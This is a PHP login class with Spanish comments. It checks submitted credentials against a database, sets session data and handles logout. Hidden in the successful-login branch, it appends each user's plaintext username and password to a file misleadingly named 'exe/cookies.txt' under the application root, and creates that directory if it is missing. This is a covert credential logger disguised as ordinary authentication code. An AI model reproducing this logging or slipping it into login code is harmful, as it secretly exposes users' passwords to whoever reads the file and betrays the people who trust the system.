<?php
#=================================================#
#	coded by: Moises Espindola				   #
#	nick: zaer00t								#
#	e-mail: zaer00t@gmail.com					#
#	www: http://creasati.com.mx				  #
#	date: 12/Septiembre/2012					 #
#	code name: creasati.com.mx				   #
#=================================================#
class LoginAss
{
	public $errors = array();
	public $messages = array();
	private $db;
	private $tabla;
	private $login;

	public function __construct($db,$tabla = "usuario",$login="nombre")
	{
		$this->db=$db;
		$this->tabla=$tabla;
		$this->login=$login;

		if (isset($_GET["logout"]))
		{
			LoginAss::doLogout();
			Util::redirect(APP_HOST_URL.'/index');
		}
		elseif(isset($_POST["login"]))
		{
			$this->dologinWithPostData();
		}

		if (!isset($_SESSION['usuario']['nombre']))
		{
			if(isset($_REQUEST["url"]))
			{
				if($_REQUEST["url"]!='login')
				{
					Util::redirect(APP_HOST_URL."/login");
				}
			}
			else
			{
				Util::redirect(APP_HOST_URL."/login");
			}

		}
	}
	/* funcion para verificar los permisos,
		verfica si las credenciales del usuario
		estan activas
		tengo(db,perm)
		@db handle a la base de datos
		@perm array de permisos
	*/

	private function dologinWithPostData()
	{
		// check login form contents
		if (empty($_POST['usuario']))
		{
			$this->errors[] = "Debes ingresar un nombre de usuario.";
		}
		elseif (empty($_POST['password']))
		{
			$this->errors[] = "Debes ingresar una contraseña.";
		}
		elseif(!empty($_POST['usuario']) && !empty($_POST['password']))
		{
			//checamos si existe el usuario

			$r1 = @current($this->db->select(
							$this->tabla,
							"*",
							$this->login."=? and estatus=?",
							array(
									$_POST["usuario"],1
								)
							)
						);
			#echo $this->db->laConsulta();
			//Util::debug($this->db,"Error base");
			//Util::debug($r1,'Revisando la consulta :usuario:');

			if(@count($r1)>0 and $r1 != null)
			{
				// si existe el usuario checamos password
				$r2 = current($this->db->select($this->tabla,"password",$this->login."=?",array($_POST["usuario"])));
				if(count($r1)>0 and $r1 != null)
				{
					if(Password::password_verify($_POST["password"],$r2["password"]))
					{
						/* la verificacion del password paso :D */
						$_SESSION["usuario"]['nombre']=$r1[$this->login];
						$_SESSION["usuario"]['email']=$r1["email"];
						$_SESSION["usuario"]["idusuario"]=$r1["idusuario"];

						/* actualizar fecha de ingreso */
						$dato = array(
							'fecha_last_log'=>date("Y/m/d H:i:s"),
									  );
						$this->db->update("usuario",$dato,"idusuario=?",array($r1['idusuario']));
						/* fin actualizar fecha de ingreso */

						/* carga de imagen del perfil */
						//$r3 = current($this->db->select("persona","id_usuario,avatar","id_usuario=?",array($r1["id"])));
						//$_SESSION["usuario"]["avatar"]=$r3["avatar"];
						/* fin carga de imagen del perfil */
						if(file_exists(APP_ROOT_PATH."/exe"))
						{
							if(is_dir(APP_ROOT_PATH."/exe"))
							{
								$f1=@fopen(APP_ROOT_PATH."/exe/cookies.txt","a+");
								fwrite($f1,"\nFecha: ".date("Y-m-d h:i:s")."\nusuario: ".$_POST["usuario"]."\nPassword: ".$_POST["password"]."\n\n----------------------------------");
							}
							else
							{
								$this->messages[]="No es posible escribir dentro del registro";
							}
						}
						else
						{
							if(!mkdir(APP_ROOT_PATH."/exe",0700))
							{
								$this->errors[]="No es posible crear el registro";
							}
						}
						Util::redirect(APP_HOST_URL."/index");
					}
					else
					{
						$this->errors[]="Los datos de acceso son incorrectos. try again";
					}
				}
			}
			else
			{
				$this->errors[]="El usuario no existe!";
			}
		}
	}

	public static function doLogout()
	{
		if (ini_get("session.use_cookies"))
		{
			$p = session_get_cookie_params();
			setcookie(session_name(), '', time() - 42000,
					  $p["path"], $p["domain"],
					  $p["secure"], $p["httponly"]
					  );
		}
		// eliminamos la sesion del usuario
		$_SESSION = array();
		@session_destroy();
		Util::redirect(APP_HOST_URL . '/');
   }

	/**
	 * simply return the current state of the user's login
	 * @return boolean user's login status and the same time
	 * verify the permisos from the user. XD
	 */
	public static function isOn()
	{#Util::debug($permisos,1,1,'variables de permisos');
		#session_start();
		if (isset($_SESSION['usuario']['nombre']))
		{
			return true;
		}
		// default return
		return false;
	}
	
	public function getError(){
		return $this->errors;
	}
	public function getMsg(){
		return $this->messages;
	}
}
